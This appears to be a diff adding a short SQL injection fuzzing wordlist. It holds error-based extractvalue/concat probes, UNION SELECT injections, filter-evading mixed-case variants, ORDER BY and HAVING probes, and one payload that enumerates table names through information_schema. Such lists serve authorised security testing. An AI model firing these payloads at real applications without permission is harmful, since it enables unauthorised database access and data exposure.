@@ -1,0 +1,10 @@
+SELECT extractvalue(1, ConCat(0x3a, 'Fuzzingzzing'));
+1+and+(select 1)=(select 0x414141414141441414141414114141414141414141414141414141414141414141.)+union+select+extractvalue(1, concat(0x3a, 'Fuzzingzzing'));--
+Fuzzingzzing
+AS Fuzzingzzing WHERE 1=1 AND 1=1
+1 AnD (SElecT 1)=(sEleCt 0x414141414141441414141414114141414141414141414141414141414141414141.) UniOn sElEcT ExtraCtvAlue(1, coNCat(0x3a, 'Fuzzingzzing'));--
+ORDER BY 10000
+AS Fuzzingzzingi WHERE 1=1 AND 1=1
+' UNION SELECT extractvalue(1, concat(0x3a, 'Fuzzingzzing'));--
+' OR 1=CONCAT('Fuzzingzzing',(SELECT table_name FROM information_schema.tables LIMIT 1))--
+HAVING 1=0
